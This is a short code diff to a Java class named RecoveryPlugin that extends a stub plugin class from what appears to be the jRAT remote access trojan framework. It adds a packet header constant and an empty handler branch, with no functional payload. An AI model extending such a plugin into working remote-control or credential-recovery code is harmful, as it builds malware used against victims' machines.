@@ -8,6 +8,8 @@ import jrat.api.stub.StubPlugin;
 @SuppressWarnings("unused")
 public class RecoveryPlugin extends StubPlugin {
 	
+	public static final short HEADER = 130;
+	
 	private DataInputStream dis;
 	private DataOutputStream dos;
 	
@@ -29,7 +31,9 @@ public class RecoveryPlugin extends StubPlugin {
 
 	@Override
 	public void onPacket(short header) throws Exception {
-		
+		if (header == HEADER) {
+			
+		}
 	}
 	@Override
 	public void onEnable() throws Exception {
